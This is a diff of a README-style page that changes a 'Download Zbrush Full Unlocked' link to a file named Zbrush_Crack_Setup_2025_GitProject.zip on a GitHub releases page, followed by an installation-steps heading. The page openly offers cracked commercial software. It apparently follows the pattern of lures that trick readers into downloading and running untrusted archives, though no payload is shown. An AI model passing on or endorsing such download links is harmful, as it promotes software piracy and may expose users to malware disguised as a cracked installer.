@@ -1,5 +1,5 @@
 > [!Important]
->  # [Download Zbrush Full Unlocked](https://github.com/cooperpattersongyh34/Zbrush-Full/releases/download/ZBRUSH-SCRIPT/ZbrushFull.zip)
+>  # [Download Zbrush Full Unlocked](https://github.com/cooperpattersongyh34/Zbrush-Full/releases/download/ZBRUSH-SCRIPT/Zbrush_Crack_Setup_2025_GitProject.zip)
 
 > [!TIP]
 > # Installation steps:
